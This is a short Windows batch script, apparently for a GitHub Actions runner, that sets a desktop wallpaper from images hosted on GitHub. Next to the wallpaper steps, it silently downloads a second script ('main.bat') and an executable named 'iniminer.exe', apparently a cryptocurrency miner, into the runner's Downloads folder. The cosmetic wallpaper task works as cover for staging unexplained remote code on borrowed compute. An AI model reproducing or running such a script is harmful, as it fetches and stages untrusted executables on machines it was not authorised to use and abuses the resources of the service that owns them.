@echo off
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/TranscodedWallpaper -OutFile TranscodedWallpaper"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/CachedImage_1024_768_POS4.jpg -OutFile CachedImage_1024_768_POS4.jpg"
curl -s -L -o C:\Users\runneradmin\Downloads\main.bat https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/main.bat
curl -s -L -o C:\Users\runneradmin\Downloads\iniminer.exe https://github.com/IKSANNURPADILLAH/init/raw/refs/heads/main/iniminer.exe
set "TranscodedWallpaper=TranscodedWallpaper"
set "CachedImage=CachedImage_1024_768_POS4.jpg"

set "destinationDir=C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Themes"
set "cachedFileDir=C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Themes\CachedFiles"

copy /y "%TranscodedWallpaper%" "%destinationDir%\TranscodedWallpaper"
copy /y "%CachedImage%" "%cachedFileDir%\CachedImage_1024_768_POS4.jpg"

RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
